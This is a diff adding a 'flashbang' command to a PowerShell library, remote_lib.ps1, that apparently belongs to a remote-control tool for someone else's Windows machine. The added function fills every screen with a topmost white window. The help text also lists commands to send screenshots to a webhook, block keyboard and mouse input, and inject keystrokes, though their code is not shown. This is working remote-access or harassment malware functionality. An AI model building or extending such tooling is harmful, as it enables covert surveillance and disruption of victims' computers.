@@ -158,16 +158,43 @@ namespace Win32 {
     echo "Your wish is my command."
 }
 
+# Command: flashbang - flashes a white screen for a duration
+function flashbang {
+    param([int]$Seconds = 1)
+    Add-Type -AssemblyName System.Drawing
+    Add-Type -AssemblyName System.Windows.Forms
+    $forms = @()
+    foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
+        $f = New-Object System.Windows.Forms.Form
+        $f.BackColor = [System.Drawing.Color]::White
+        $f.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
+        $f.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
+        $f.Bounds = $screen.Bounds
+        $f.TopMost = $true
+        $f.ShowInTaskbar = $false
+        $f.Show()
+        $f.Refresh()
+        $forms += $f
+    }
+    Start-Sleep -Seconds $Seconds
+    foreach ($f in $forms) {
+        $f.Close()
+        $f.Dispose()
+    }
+    echo "Your wish is my command."
+}
+
 # Help command – list available remote‑library commands
 function hlp {
     $commands = @{
-        "ss"      = "capture a screenshot and send it to the webhook."
-        "block"   = "block keyboard and mouse input for a duration (default 5s)"
-        "unblock" = "manually unblock keyboard and mouse input"
-        "popup"   = "open a message popup"
-        "tts"     = "just text to speech twin"
-        "press"   = "simulate typing keys (e.g. press windows d or press enter)"
-        "hlp"     = "js shows all the commands"
+        "ss"        = "capture a screenshot and send it to the webhook."
+        "block"     = "block keyboard and mouse input for a duration (default 5s)"
+        "unblock"   = "manually unblock keyboard and mouse input"
+        "popup"     = "open a message popup"
+        "tts"       = "just text to speech twin"
+        "press"     = "simulate typing keys (e.g. press windows d or press enter)"
+        "flashbang" = "trigger a full white flashbang screen (default 1s)"
+        "hlp"       = "js shows all the commands"
     }
     Write-Host "Remote Library Commands:`n"
     foreach ($k in $commands.Keys) {
@@ -176,6 +203,6 @@ function hlp {
 }
 
 # Export the command list to a global variable for easy enumeration (optional)
-$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'popup', 'tts', 'press', 'hlp')
+$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'popup', 'tts', 'press', 'flashbang', 'hlp')
 
 # End of remote_lib.ps1
